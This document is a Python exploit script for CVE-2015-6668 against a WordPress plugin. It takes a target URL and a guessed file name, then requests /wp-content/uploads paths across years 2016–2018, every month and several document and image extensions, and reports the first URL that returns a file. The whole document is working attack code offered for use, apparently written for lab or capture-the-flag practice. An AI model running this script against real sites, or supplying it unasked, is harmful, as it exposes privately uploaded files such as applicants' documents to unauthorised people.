#!/usr/bin/python3
import requests
import argparse
from pwn import log


def get_user_argument()->argparse.Namespace:
    """
    Get arguments from user
    """
    parser = argparse.ArgumentParser(description="CVE-2015-6668 exploit.")
    parser.add_argument('url', type=str, help='Url to attempt attack. Example: http://10.10.10.10')
    parser.add_argument('filetosearch', type=str, help='File to search. For example, if we suspect that "example.jpg" exists, we can pass "example"')

    return parser.parse_args()


def exploit(url: str, file: str):
    p = log.progress("Making request to url")
    extensions_to_search: list[str] = ["docx", "pdf", "jpeg", "png", "jpg"]
    file2 = file.replace(" ", "-")
    for year in range(2016, 2019):
        for i in range(1, 13):
            for extension in extensions_to_search:
                url_vuln = f"{url}/wp-content/uploads/{year}/{i:02}/{file2}.{extension}"
                p.status(url_vuln)
                r = requests.get(url_vuln.strip())
                if r.status_code == 200:
                    p.success(f"Url found: {url_vuln}")
                    return
    p.failure("Could not find any file")
    return


def main()->None:
    args: argparse.Namespace = get_user_argument()
    exploit(args.url, args.filetosearch)


if __name__ == "__main__":
    main()
